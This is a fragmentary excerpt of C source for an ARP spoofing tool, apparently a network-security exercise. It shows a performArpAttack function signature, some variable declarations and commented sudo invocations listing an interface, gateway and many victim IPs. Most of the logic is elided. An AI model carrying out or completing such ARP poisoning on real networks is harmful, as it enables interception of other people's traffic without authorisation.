...
int performArpAttack(pcap_t* handle, char* dev, in_addr my_ip, uint8_t *my_mac, in_addr gateway_ip, in_addr sender_ip, in_addr target_ip){
	int flag_send;
	//flag_send
	//1: find sender mac
	//2: find target mac
	...
	struct in_addr ip_of_new_addr;
	uint8_t sender_mac[6], target_mac[6], new_mac_addr[6];
	while (1) {
...
int main(int argc, char* argv[]) {
	//sudo ./send-arp-test wlan0 172.20.10.2 172.20.10.14
	//sudo ./send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.4
	//sudo ./send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.4 192.168.10.5 192.168.10.6
	//sudo ./send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.4 192.168.10.5 192.168.10.6 192.168.10.7 192.168.10.8
	//sudo ./send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.4 192.168.10.5 192.168.10.6 192.168.10.7 192.168.10.8 192.168.10.9 192.168.10.10
